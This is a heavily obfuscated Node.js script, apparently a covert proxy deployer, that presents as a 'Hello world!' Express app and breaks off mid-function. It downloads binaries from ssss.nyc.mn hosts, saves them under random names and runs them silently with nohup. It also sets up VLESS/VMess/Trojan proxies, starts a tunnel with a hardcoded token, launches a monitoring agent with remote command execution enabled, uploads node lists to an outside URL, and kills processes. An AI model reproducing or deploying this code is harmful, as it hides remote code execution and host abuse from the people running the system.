const _0x12ea22=_0x8b88;(function(_0x4b37f0,_0x1537a9){const _0xa920dd={_0x208d2f:0x221,_0x111db0:0x1e0,_0x163ebc:0x213,_0x5b735a:0x263,_0x1ae941:0x291},_0x3a52fc=_0x8b88,_0x41695f=_0x4b37f0();while(!![]){try{const _0x475a87=parseInt(_0x3a52fc(_0xa920dd._0x208d2f))/0x1*(parseInt(_0x3a52fc(0x27b))/0x2)+parseInt(_0x3a52fc(_0xa920dd._0x111db0))/0x3*(-parseInt(_0x3a52fc(0x217))/0x4)+-parseInt(_0x3a52fc(0x279))/0x5*(parseInt(_0x3a52fc(0x25f))/0x6)+-parseInt(_0x3a52fc(0x208))/0x7*(parseInt(_0x3a52fc(0x233))/0x8)+-parseInt(_0x3a52fc(_0xa920dd._0x163ebc))/0x9*(-parseInt(_0x3a52fc(_0xa920dd._0x5b735a))/0xa)+-parseInt(_0x3a52fc(_0xa920dd._0x1ae941))/0xb+-parseInt(_0x3a52fc(0x257))/0xc*(-parseInt(_0x3a52fc(0x206))/0xd);if(_0x475a87===_0x1537a9)break;else _0x41695f['push'](_0x41695f['shift']());}catch(_0x5ec8fe){_0x41695f['push'](_0x41695f['shift']());}}}(_0x33d6,0x8858c));const express=require('express'),app=express(),axios=require(_0x12ea22(0x1ea)),os=require('os'),fs=require('fs'),path=require(_0x12ea22(0x245)),{promisify}=require(_0x12ea22(0x235)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x12ea22(0x287)),UPLOAD_URL=process[_0x12ea22(0x219)][_0x12ea22(0x1d7)]||'',PROJECT_URL=process[_0x12ea22(0x219)][_0x12ea22(0x22e)]||'',AUTO_ACCESS=process[_0x12ea22(0x219)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x12ea22(0x219)][_0x12ea22(0x26c)]||'./tmp',SUB_PATH=process[_0x12ea22(0x219)][_0x12ea22(0x1e5)]||'sub',PORT=process['env'][_0x12ea22(0x20d)]||process[_0x12ea22(0x219)][_0x12ea22(0x21b)]||0xbb8,UUID=process['env'][_0x12ea22(0x28f)]||_0x12ea22(0x292),NEZHA_SERVER=process[_0x12ea22(0x219)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x12ea22(0x219)][_0x12ea22(0x209)]||'',NEZHA_KEY=process[_0x12ea22(0x219)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x12ea22(0x219)]['ARGO_DOMAIN']||_0x12ea22(0x1d9),ARGO_AUTH=process[_0x12ea22(0x219)][_0x12ea22(0x240)]||_0x12ea22(0x28c),ARGO_PORT=process[_0x12ea22(0x219)][_0x12ea22(0x1dc)]||0x1f41,CFIP=process[_0x12ea22(0x219)][_0x12ea22(0x24f)]||_0x12ea22(0x280),CFPORT=process['env'][_0x12ea22(0x226)]||0x1bb,NAME=process[_0x12ea22(0x219)][_0x12ea22(0x289)]||_0x12ea22(0x266);function _0x8b88(_0xc937ee,_0xfca932){const _0x33d603=_0x33d6();return _0x8b88=function(_0x8b88b9,_0x3c51f6){_0x8b88b9=_0x8b88b9-0x1d3;let _0x4d4f91=_0x33d603[_0x8b88b9];return _0x4d4f91;},_0x8b88(_0xc937ee,_0xfca932);}!fs[_0x12ea22(0x253)](FILE_PATH)?(fs[_0x12ea22(0x20f)](FILE_PATH),console[_0x12ea22(0x1d8)](FILE_PATH+_0x12ea22(0x1d5))):console[_0x12ea22(0x1d8)](FILE_PATH+_0x12ea22(0x1e2));function generateRandomName(){const _0x2bbe92={_0xfe7016:0x1ff},_0x598f45=_0x12ea22,_0xdb9f69=_0x598f45(_0x2bbe92._0xfe7016);let _0x316c66='';for(let _0x1cb76a=0x0;_0x1cb76a<0x6;_0x1cb76a++){_0x316c66+=_0xdb9f69['charAt'](Math[_0x598f45(0x244)](Math[_0x598f45(0x1f3)]()*_0xdb9f69[_0x598f45(0x204)]));}return _0x316c66;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x12ea22(0x200)](FILE_PATH,phpName),webPath=path[_0x12ea22(0x200)](FILE_PATH,webName),botPath=path[_0x12ea22(0x200)](FILE_PATH,botName),subPath=path[_0x12ea22(0x200)](FILE_PATH,_0x12ea22(0x24d)),listPath=path[_0x12ea22(0x200)](FILE_PATH,_0x12ea22(0x202)),bootLogPath=path[_0x12ea22(0x200)](FILE_PATH,_0x12ea22(0x1f5)),configPath=path[_0x12ea22(0x200)](FILE_PATH,_0x12ea22(0x247));function _0x33d6(){const _0x31f0dc=['vless','boot.log','false','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','basename','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','direct','ARGO_DOMAIN:','arm64','https://arm64.ssss.nyc.mn/agent','then','abcdefghijklmnopqrstuvwxyz','join','text/plain;\x20charset=utf-8','list.txt','\x20-s\x20','length','forEach','6091787Acmdaa','finish','7AwPVXj','NEZHA_PORT','match','&fp=firefox&type=ws&host=','set','SERVER_PORT','writeFileSync','mkdirSync','443','https://amd64.ssss.nyc.mn/web','Hello\x20world!','45ScVket','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','pop','unlink','57308qfmwrm','stringify','env','2096','PORT','\x20>/dev/null\x202>&1\x20&','none','http://ip-api.com/json/','amd','from','8jVsCnh','close','response','Skipping\x20adding\x20automatic\x20access\x20task','application/json','CFPORT','taskkill\x20/f\x20/im\x20','Unknown','block','https://amd64.ssss.nyc.mn/v1','php\x20running\x20error:\x20','pipe','del\x20/f\x20/q\x20','PROJECT_URL','clear','send','quic','firefox','4538656kZGbne','127.0.0.1','util','catch','base64','ArgoDomain:','listen','tls','utf-8','\x20is\x20running','blackhole','toString','true','ARGO_AUTH','Add\x20automatic\x20access\x20task\x20faild:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','App\x20is\x20running','floor','path','?encryption=none&security=tls&sni=','config.json','country_code','8443','/api/add-subscriptions','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','unshift','sub.txt','TunnelSecret','CFIP','push','\x20>/dev/null\x202>&1','statSync','existsSync','trojan','config.yaml','nohup\x20','36tVWLic','Nodes\x20uploaded\x20successfully','message','/vless-argo','has','substring','/api/add-nodes','\x0a\x20\x20\x20\x20','11226FuiQUy','/config.json\x20>/dev/null\x202>&1\x20&','isFile','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','1307020gvqJFF','http','platform','north','arm','\x0avless://','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','https://amd64.ssss.nyc.mn/bot','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','FILE_PATH','freedom','error','Empowerment\x20failed\x20for\x20','Download\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','tcp','success','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://ipapi.co/json/','https://arm64.ssss.nyc.mn/v1','Error\x20reading\x20boot.log:','965IIWckT','\x20failed:\x20','154034cuWXGl','https://arm64.ssss.nyc.mn/web','unlinkSync','post','fileName','cdns.doon.eu.org','all','get','web\x20running\x20error:\x20','readFileSync','chmod','/vmess-argo','child_process','Content-Type','NAME','\x20>\x20nul\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','eyJhIjoiMjZmODZlZmI1NzU1OWMwMDc0NDUzYjZkOGYzOWEzZjEiLCJ0IjoiMTJjMjVmZmMtOWFlOC00NDlmLWE4OGYtZTAwZjk5OTc1ODE4IiwicyI6Ik1UaGlNbUZoTVRZdE9HRXdaUzAwWW1FMkxUaGlZekF0TURRek1XSXpNRGhpTVRrNCJ9','tunnel.json','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','UUID','test','3460435GLtEqe','2160c5b2-3807-4546-8ace-eae5f793ac55','Unhandled\x20error\x20in\x20startserver:','tunnel.yml','data','pkill\x20-f\x20\x22[','\x20is\x20created','charAt','UPLOAD_URL','log','north.mazter.nyc.mn','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','status','ARGO_PORT','https://amd64.ssss.nyc.mn/agent','countryCode','split','183NlRLEv','\x0a\x0atrojan://','\x20already\x20exists','/trojan-argo','filter','SUB_PATH','&path=%2Fvless-argo%3Fed%3D2560#','org','includes','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','axios','2053','Subscription\x20uploaded\x20successfully','xtls-rprx-vision','Error\x20executing\x20command:\x20','arch','\x0aclient_secret:\x20','Error\x20downloading\x20files:','\x20successfully','random'];_0x33d6=function(){return _0x31f0dc;};return _0x33d6();}function deleteNodes(){const _0xd4832f={_0xd6deb6:0x284},_0x23b08e=_0x12ea22;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xa25bb6;try{_0xa25bb6=fs[_0x23b08e(_0xd4832f._0xd6deb6)](subPath,_0x23b08e(0x23b));}catch{return null;}const _0x254592=Buffer['from'](_0xa25bb6,'base64')[_0x23b08e(0x23e)](_0x23b08e(0x23b)),_0x24d930=_0x254592['split']('\x0a')['filter'](_0x528dbc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x23b08e(0x290)](_0x528dbc));if(_0x24d930['length']===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x23b08e(0x218)]({'nodes':_0x24d930}),{'headers':{'Content-Type':'application/json'}})[_0x23b08e(0x236)](_0x2f4316=>{return null;}),null;}catch(_0x4d3c42){return null;}}function cleanupOldFiles(){const _0x2f6b74={_0x4b8397:0x200,_0x547530:0x252},_0xc10881=_0x12ea22;try{const _0x35f9fc=fs['readdirSync'](FILE_PATH);_0x35f9fc[_0xc10881(0x205)](_0x336b84=>{const _0x167563=_0xc10881,_0x448818=path[_0x167563(_0x2f6b74._0x4b8397)](FILE_PATH,_0x336b84);try{const _0x1179a7=fs[_0x167563(_0x2f6b74._0x547530)](_0x448818);_0x1179a7[_0x167563(0x261)]()&&fs['unlinkSync'](_0x448818);}catch(_0x23ac6b){}});}catch(_0x4a8fcb){}}app['get']('/',function(_0x3412aa,_0x7a7ba2){const _0x4548f9=_0x12ea22;_0x7a7ba2[_0x4548f9(0x230)](_0x4548f9(0x212));});async function generateConfig(){const _0xbdffa5={_0x55fc76:0x1f4,_0x2bf403:0x1ed,_0x5252dc:0x273,_0x38702c:0x21d,_0x122261:0x234,_0x996718:0x264,_0x69093c:0x26d,_0x5039d8:0x1fa,_0x32853e:0x218},_0x94e8d4=_0x12ea22,_0x176f56={'log':{'access':'/dev/null','error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x94e8d4(_0xbdffa5._0x55fc76),'settings':{'clients':[{'id':UUID,'flow':_0x94e8d4(_0xbdffa5._0x2bf403)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x94e8d4(0x25a),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x94e8d4(0x273)}},{'port':0xbb9,'listen':_0x94e8d4(0x234),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x94e8d4(0x21d)},'streamSettings':{'network':_0x94e8d4(_0xbdffa5._0x5252dc),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x94e8d4(_0xbdffa5._0x38702c)},'streamSettings':{'network':'ws','security':_0x94e8d4(0x21d),'wsSettings':{'path':_0x94e8d4(0x25a)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x94e8d4(0x23a),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x94e8d4(_0xbdffa5._0x122261),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x94e8d4(0x286)}},'sniffing':{'enabled':!![],'destOverride':[_0x94e8d4(_0xbdffa5._0x996718),_0x94e8d4(0x23a),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x94e8d4(_0xbdffa5._0x122261),'protocol':_0x94e8d4(0x254),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x94e8d4(0x21d),'wsSettings':{'path':_0x94e8d4(0x1e3)}},'sniffing':{'enabled':!![],'destOverride':[_0x94e8d4(0x264),_0x94e8d4(0x23a),_0x94e8d4(0x231)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x94e8d4(_0xbdffa5._0x69093c),'tag':_0x94e8d4(_0xbdffa5._0x5039d8)},{'protocol':_0x94e8d4(0x23d),'tag':_0x94e8d4(0x229)}]};fs[_0x94e8d4(0x20e)](path[_0x94e8d4(0x200)](FILE_PATH,_0x94e8d4(0x247)),JSON[_0x94e8d4(_0xbdffa5._0x32853e)](_0x176f56,null,0x2));}function getSystemArchitecture(){const _0x59da16={_0x56eed1:0x1ef,_0x477fcf:0x1fc,_0x8d4301:0x21f},_0x1223e1=_0x12ea22,_0x94f850=os[_0x1223e1(_0x59da16._0x56eed1)]();return _0x94f850===_0x1223e1(0x267)||_0x94f850===_0x1223e1(_0x59da16._0x477fcf)||_0x94f850==='aarch64'?'arm':_0x1223e1(_0x59da16._0x8d4301);}function downloadFile(_0x69a262,_0x1bc122,_0x4577ca){const _0x2ca422={_0x2c230f:0x20f,_0x1e6a2e:0x282,_0x31e971:0x1fe},_0x43d7ec={_0x23ee9e:0x1f8,_0x15d5f4:0x259},_0x37d4d6={_0x595f1a:0x22c,_0x3cd2ea:0x207,_0x14611d:0x26e},_0x5deefd={_0x4a2a8c:0x216,_0x59406d:0x1f8,_0x5e21a5:0x27a,_0x4ac7b4:0x259},_0x7d4954={_0x29d011:0x222,_0x26ed26:0x270},_0x3239cd=_0x12ea22,_0x42feb2=_0x69a262;!fs['existsSync'](FILE_PATH)&&fs[_0x3239cd(_0x2ca422._0x2c230f)](FILE_PATH,{'recursive':!![]});const _0x1e64d1=fs['createWriteStream'](_0x42feb2);axios({'method':_0x3239cd(_0x2ca422._0x1e6a2e),'url':_0x1bc122,'responseType':'stream'})[_0x3239cd(_0x2ca422._0x31e971)](_0x17ab35=>{const _0x1c2029=_0x3239cd;_0x17ab35[_0x1c2029(0x1d3)][_0x1c2029(_0x37d4d6._0x595f1a)](_0x1e64d1),_0x1e64d1['on'](_0x1c2029(_0x37d4d6._0x3cd2ea),()=>{const _0x54dd46=_0x1c2029;_0x1e64d1[_0x54dd46(_0x7d4954._0x29d011)](),console['log'](_0x54dd46(_0x7d4954._0x26ed26)+path[_0x54dd46(0x1f8)](_0x42feb2)+_0x54dd46(0x1f2)),_0x4577ca(null,_0x42feb2);}),_0x1e64d1['on'](_0x1c2029(_0x37d4d6._0x14611d),_0x322038=>{const _0x1493b1=_0x1c2029;fs[_0x1493b1(_0x5deefd._0x4a2a8c)](_0x42feb2,()=>{});const _0x1ea610=_0x1493b1(0x270)+path[_0x1493b1(_0x5deefd._0x59406d)](_0x42feb2)+_0x1493b1(_0x5deefd._0x5e21a5)+_0x322038[_0x1493b1(_0x5deefd._0x4ac7b4)];console[_0x1493b1(0x26e)](_0x1ea610),_0x4577ca(_0x1ea610);});})[_0x3239cd(0x236)](_0x5f0025=>{const _0x3dc5a6=_0x3239cd,_0x45728f=_0x3dc5a6(0x270)+path[_0x3dc5a6(_0x43d7ec._0x23ee9e)](_0x42feb2)+'\x20failed:\x20'+_0x5f0025[_0x3dc5a6(_0x43d7ec._0x15d5f4)];console[_0x3dc5a6(0x26e)](_0x45728f),_0x4577ca(_0x45728f);});}async function downloadFilesAndRun(){const _0x31a0a2={_0x26c560:0x26b,_0xc24363:0x281,_0x148b70:0x26e,_0x23c0fb:0x1f1,_0x153195:0x215,_0x468932:0x25b,_0x19f394:0x23f,_0x55d518:0x1f0,_0x37bffd:0x242,_0x4f3fac:0x1f9,_0x4e3080:0x28e,_0x5681ae:0x20e,_0x403027:0x200,_0x22ad93:0x255,_0x1be24a:0x1d8,_0x46ff3a:0x22b,_0x282559:0x249,_0x2b55b:0x1eb,_0x515445:0x203,_0x4ed5f7:0x23c,_0x5a36f2:0x256,_0x14e85f:0x23c,_0x415f89:0x256,_0x48269f:0x21c},_0x5c8a18={_0x29681a:0x205},_0x47b8f3={_0x408363:0x27f},_0x251225=_0x12ea22,_0x1bee46=getSystemArchitecture(),_0xf57888=getFilesForArchitecture(_0x1bee46);if(_0xf57888[_0x251225(0x204)]===0x0){console[_0x251225(0x1d8)](_0x251225(_0x31a0a2._0x26c560));return;}const _0x3daa29=_0xf57888['map'](_0x300124=>{return new Promise((_0x51107d,_0xdc2f5c)=>{const _0x590270=_0x8b88;downloadFile(_0x300124[_0x590270(_0x47b8f3._0x408363)],_0x300124['fileUrl'],(_0x5aeb64,_0xb96587)=>{_0x5aeb64?_0xdc2f5c(_0x5aeb64):_0x51107d(_0xb96587);});});});try{await Promise[_0x251225(_0x31a0a2._0xc24363)](_0x3daa29);}catch(_0xa6917a){console[_0x251225(_0x31a0a2._0x148b70)](_0x251225(_0x31a0a2._0x23c0fb),_0xa6917a);return;}function _0x4c5a2d(_0x34420d){const _0x5c28e1={_0x366ced:0x285},_0x4b75e8={_0x39f8ab:0x26e},_0x267b6e=_0x251225,_0x4d9c8e=0x1fd;_0x34420d[_0x267b6e(_0x5c8a18._0x29681a)](_0x4c6ace=>{const _0x17eb32=_0x267b6e;fs['existsSync'](_0x4c6ace)&&fs[_0x17eb32(_0x5c28e1._0x366ced)](_0x4c6ace,_0x4d9c8e,_0x5d6958=>{const _0x2ceaa7=_0x17eb32;_0x5d6958?console[_0x2ceaa7(_0x4b75e8._0x39f8ab)](_0x2ceaa7(0x26f)+_0x4c6ace+':\x20'+_0x5d6958):console[_0x2ceaa7(0x1d8)]('Empowerment\x20success\x20for\x20'+_0x4c6ace+':\x20'+_0x4d9c8e[_0x2ceaa7(0x23e)](0x8));});});}const _0x480c34=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4c5a2d(_0x480c34);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x404cb7=NEZHA_SERVER[_0x251225(0x1e8)](':')?NEZHA_SERVER[_0x251225(0x1df)](':')[_0x251225(_0x31a0a2._0x153195)]():'',_0x33d2d3=new Set(['443',_0x251225(0x249),_0x251225(0x21a),'2087','2083',_0x251225(0x1eb)]),_0x1556ce=_0x33d2d3[_0x251225(_0x31a0a2._0x468932)](_0x404cb7)?_0x251225(_0x31a0a2._0x19f394):_0x251225(0x1f6),_0x2b390d=_0x251225(_0x31a0a2._0x55d518)+NEZHA_KEY+_0x251225(_0x31a0a2._0x37bffd)+NEZHA_SERVER+_0x251225(_0x31a0a2._0x4f3fac)+_0x1556ce+_0x251225(_0x31a0a2._0x4e3080)+UUID;fs[_0x251225(_0x31a0a2._0x5681ae)](path[_0x251225(_0x31a0a2._0x403027)](FILE_PATH,_0x251225(_0x31a0a2._0x22ad93)),_0x2b390d);const _0x29177b=_0x251225(0x256)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x29177b),console[_0x251225(_0x31a0a2._0x1be24a)](phpName+_0x251225(0x23c)),await new Promise(_0xc3400e=>setTimeout(_0xc3400e,0x3e8));}catch(_0x15fc8f){console[_0x251225(0x26e)](_0x251225(_0x31a0a2._0x46ff3a)+_0x15fc8f);}}else{let _0x25ce6e='';const _0x4bbf3f=[_0x251225(0x210),_0x251225(_0x31a0a2._0x282559),_0x251225(0x21a),'2087','2083',_0x251225(_0x31a0a2._0x2b55b)];_0x4bbf3f[_0x251225(0x1e8)](NEZHA_PORT)&&(_0x25ce6e='--tls');const _0x29b4fa=_0x251225(0x256)+npmPath+_0x251225(_0x31a0a2._0x515445)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x25ce6e+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x29b4fa),console[_0x251225(0x1d8)](npmName+_0x251225(_0x31a0a2._0x4ed5f7)),await new Promise(_0x1984e3=>setTimeout(_0x1984e3,0x3e8));}catch(_0x409461){console[_0x251225(0x26e)]('npm\x20running\x20error:\x20'+_0x409461);}}}else console[_0x251225(0x1d8)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x5d0b61=_0x251225(_0x31a0a2._0x5a36f2)+webPath+'\x20-c\x20'+FILE_PATH+_0x251225(0x260);try{await exec(_0x5d0b61),console[_0x251225(0x1d8)](webName+_0x251225(_0x31a0a2._0x14e85f)),await new Promise(_0x153847=>setTimeout(_0x153847,0x3e8));}catch(_0x192734){console[_0x251225(0x26e)](_0x251225(0x283)+_0x192734);}if(fs[_0x251225(0x253)](botPath)){let _0x5cdaf8;if(ARGO_AUTH[_0x251225(0x20a)](/^[A-Z0-9a-z=]{120,250}$/))_0x5cdaf8=_0x251225(0x28b)+ARGO_AUTH;else ARGO_AUTH[_0x251225(0x20a)](/TunnelSecret/)?_0x5cdaf8=_0x251225(0x214)+FILE_PATH+'/tunnel.yml\x20run':_0x5cdaf8=_0x251225(0x24b)+FILE_PATH+_0x251225(0x271)+ARGO_PORT;try{await exec(_0x251225(_0x31a0a2._0x415f89)+botPath+'\x20'+_0x5cdaf8+_0x251225(_0x31a0a2._0x48269f)),console[_0x251225(_0x31a0a2._0x1be24a)](botName+_0x251225(_0x31a0a2._0x14e85f)),await new Promise(_0x3ddf57=>setTimeout(_0x3ddf57,0x7d0));}catch(_0x17bbcc){console['error']('Error\x20executing\x20command:\x20'+_0x17bbcc);}}await new Promise(_0x2a3b5f=>setTimeout(_0x2a3b5f,0x1388));}function getFilesForArchitecture(_0x4b5362){const _0x140a25={_0x1d5173:0x27c,_0x561d0d:0x211,_0x114e34:0x26a,_0x5cacd5:0x1dd,_0x103350:0x22a},_0x30e81c=_0x12ea22;let _0x4b256a;_0x4b5362==='arm'?_0x4b256a=[{'fileName':webPath,'fileUrl':_0x30e81c(_0x140a25._0x1d5173)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x4b256a=[{'fileName':webPath,'fileUrl':_0x30e81c(_0x140a25._0x561d0d)},{'fileName':botPath,'fileUrl':_0x30e81c(_0x140a25._0x114e34)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x7a6e84=_0x4b5362==='arm'?_0x30e81c(0x1fd):_0x30e81c(_0x140a25._0x5cacd5);_0x4b256a['unshift']({'fileName':npmPath,'fileUrl':_0x7a6e84});}else{const _0x3f791a=_0x4b5362==='arm'?_0x30e81c(0x277):_0x30e81c(_0x140a25._0x103350);_0x4b256a[_0x30e81c(0x24c)]({'fileName':phpPath,'fileUrl':_0x3f791a});}}return _0x4b256a;}function argoType(){const _0xcadd58={_0x4ec3a1:0x1d8,_0x4f4867:0x200,_0x5c4c30:0x28d,_0x523dae:0x1da,_0x5c62c2:0x294},_0x40ec7b=_0x12ea22;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x40ec7b(_0xcadd58._0x4ec3a1)](_0x40ec7b(0x1f7));return;}if(ARGO_AUTH['includes'](_0x40ec7b(0x24e))){fs[_0x40ec7b(0x20e)](path[_0x40ec7b(0x200)](FILE_PATH,_0x40ec7b(0x28d)),ARGO_AUTH);const _0x47dc37='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x40ec7b(0x1df)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x40ec7b(_0xcadd58._0x4f4867)](FILE_PATH,_0x40ec7b(_0xcadd58._0x5c4c30))+_0x40ec7b(0x272)+ARGO_DOMAIN+_0x40ec7b(_0xcadd58._0x523dae)+ARGO_PORT+_0x40ec7b(0x1e9);fs['writeFileSync'](path['join'](FILE_PATH,_0x40ec7b(_0xcadd58._0x5c62c2)),_0x47dc37);}else console['log'](_0x40ec7b(0x262));}async function extractDomains(){const _0x1baca5={_0x3b8871:0x1d8,_0x44837c:0x1fb,_0x269787:0x284,_0x4125bc:0x200,_0x2afb46:0x23b,_0x181244:0x205,_0x1226b9:0x204,_0x49ae3c:0x269,_0x4a9112:0x27d,_0x50f0bd:0x21c,_0x4d08f8:0x1d8,_0x2bcf27:0x23c,_0xb8831e:0x1ee,_0x36871d:0x278},_0x2bc392={_0x113f7d:0x276,_0x35c241:0x1d3,_0x43dad5:0x248,_0x533c24:0x1d3,_0x48ea8b:0x1e7,_0xa444a8:0x248,_0x79dbaf:0x282,_0x23fd49:0x1d3,_0x2bb5bf:0x1db,_0x1cfc27:0x274,_0x4145f5:0x1d3,_0x356b15:0x1d3,_0x4ce66e:0x228},_0x5b14a3={_0x45f2f4:0x227,_0x16902f:0x1d4,_0x3d7552:0x1d6,_0x57c4c1:0x25c},_0x565011={_0x39cec0:0x20a},_0x2f7f9f=_0x12ea22;let _0x5094b3;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5094b3=ARGO_DOMAIN,console[_0x2f7f9f(_0x1baca5._0x3b8871)](_0x2f7f9f(_0x1baca5._0x44837c),_0x5094b3),await _0x4787ce(_0x5094b3);else try{const _0x25bed6=fs[_0x2f7f9f(_0x1baca5._0x269787)](path[_0x2f7f9f(_0x1baca5._0x4125bc)](FILE_PATH,'boot.log'),_0x2f7f9f(_0x1baca5._0x2afb46)),_0x46ba3f=_0x25bed6[_0x2f7f9f(0x1df)]('\x0a'),_0x1cb030=[];_0x46ba3f[_0x2f7f9f(_0x1baca5._0x181244)](_0x5c5f19=>{const _0x45b9b8=_0x2f7f9f,_0xfb8acb=_0x5c5f19[_0x45b9b8(_0x565011._0x39cec0)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xfb8acb){const _0xf72fe=_0xfb8acb[0x1];_0x1cb030['push'](_0xf72fe);}});if(_0x1cb030[_0x2f7f9f(_0x1baca5._0x1226b9)]>0x0)_0x5094b3=_0x1cb030[0x0],console[_0x2f7f9f(0x1d8)](_0x2f7f9f(0x238),_0x5094b3),await _0x4787ce(_0x5094b3);else{console[_0x2f7f9f(0x1d8)](_0x2f7f9f(_0x1baca5._0x49ae3c)),fs[_0x2f7f9f(_0x1baca5._0x4a9112)](path['join'](FILE_PATH,_0x2f7f9f(0x1f5)));async function _0x5e19bd(){const _0x11f17a=_0x2f7f9f;try{process[_0x11f17a(0x265)]==='win32'?await exec(_0x11f17a(_0x5b14a3._0x45f2f4)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x11f17a(_0x5b14a3._0x16902f)+botName[_0x11f17a(_0x5b14a3._0x3d7552)](0x0)+']'+botName[_0x11f17a(_0x5b14a3._0x57c4c1)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x2d4277){}}_0x5e19bd(),await new Promise(_0x3c0eb8=>setTimeout(_0x3c0eb8,0xbb8));const _0x2fe86c=_0x2f7f9f(0x24b)+FILE_PATH+_0x2f7f9f(0x271)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2fe86c+_0x2f7f9f(_0x1baca5._0x50f0bd)),console[_0x2f7f9f(_0x1baca5._0x4d08f8)](botName+_0x2f7f9f(_0x1baca5._0x2bcf27)),await new Promise(_0x3348d5=>setTimeout(_0x3348d5,0xbb8)),await extractDomains();}catch(_0xbdf63e){console['error'](_0x2f7f9f(_0x1baca5._0xb8831e)+_0xbdf63e);}}}catch(_0x49d9ba){console['error'](_0x2f7f9f(_0x1baca5._0x36871d),_0x49d9ba);}async function _0xdfc490(){const _0x5b1cfa=_0x2f7f9f;try{const _0x235b5d=await axios[_0x5b1cfa(0x282)](_0x5b1cfa(_0x2bc392._0x113f7d),{'timeout':0xbb8});if(_0x235b5d[_0x5b1cfa(0x1d3)]&&_0x235b5d[_0x5b1cfa(_0x2bc392._0x35c241)][_0x5b1cfa(_0x2bc392._0x43dad5)]&&_0x235b5d[_0x5b1cfa(_0x2bc392._0x533c24)][_0x5b1cfa(_0x2bc392._0x48ea8b)])return _0x235b5d[_0x5b1cfa(0x1d3)][_0x5b1cfa(_0x2bc392._0xa444a8)]+'_'+_0x235b5d['data'][_0x5b1cfa(_0x2bc392._0x48ea8b)];}catch(_0x499360){try{const _0x22565e=await axios[_0x5b1cfa(_0x2bc392._0x79dbaf)](_0x5b1cfa(0x21e),{'timeout':0xbb8});if(_0x22565e['data']&&_0x22565e[_0x5b1cfa(_0x2bc392._0x23fd49)][_0x5b1cfa(_0x2bc392._0x2bb5bf)]===_0x5b1cfa(_0x2bc392._0x1cfc27)&&_0x22565e[_0x5b1cfa(0x1d3)][_0x5b1cfa(0x1de)]&&_0x22565e[_0x5b1cfa(_0x2bc392._0x4145f5)][_0x5b1cfa(_0x2bc392._0x48ea8b)])return 